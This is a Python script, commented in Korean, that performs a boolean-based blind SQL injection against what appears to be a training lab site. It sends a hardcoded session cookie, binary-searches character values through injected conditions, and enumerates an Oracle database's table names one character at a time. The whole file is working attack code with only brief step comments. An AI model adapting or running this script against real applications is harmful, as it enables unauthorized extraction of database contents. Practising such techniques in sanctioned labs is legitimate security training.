import requests

주소 = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"

쿠키 = {
 "JSESSIONID":"53ADE9803F529FAE8705C2553915EA21"
}

def 값찾기(쿼리):
    시작점 = 1
    끝점 = 127    
    while 시작점 < 끝점:
        중간점 = int((시작점 + 끝점) / 2)
        공격쿼리 = f"({쿼리}) > {중간점}"
        공격주소 = 주소 + " and " + 공격쿼리
        응답 = requests.get(url=공격주소, cookies=쿠키)
        if "애플워치" in 응답.text:
            시작점 = 중간점 + 1
        else:
            끝점 = 중간점
    return 끝점

# 1. 쿼리문유추
# 2. 공격포인트
# 3. 테이블명 
#    select table_name from user_tables 
#   3-1. 테이블 개수 
공격쿼리="select count(table_name) from user_tables"
테이블개수=값찾기(공격쿼리)
print(f"테이블 개수 : {테이블개수}개")
#   3-2. 테이블 1row씩
#   select a from (select table_name a, rownum b from user_tables) where b = 1~테이블개수
#   3-2-1. 글자수:
#   select length(a) from (select table_name a, rownum b from user_tables) where b = 1~테이블개수
for rownum in range(1, 테이블개수+1):
    공격쿼리= f"select length(a) from (select table_name a, rownum b from user_tables) where b = {rownum}"
    글자수 = 값찾기(공격쿼리)
    print(f"{rownum}번째 테이블명 글자수: {글자수}")
#   3-2-2. 한글자씩 ascii: 
#   select ascii(substr(a,1~글자수,1)) from (select table_name a, rownum b from user_tables) where b = 1
    for substr in range(1, 글자수+1):
        공격쿼리 = f"select ascii(substr(a,{substr},1)) from (select table_name a, rownum b from user_tables) where b = {rownum}"
        아스키 = 값찾기(공격쿼리)
        print(f"{rownum}번째 테이블의 {substr}번째 글자: {chr(아스키)}")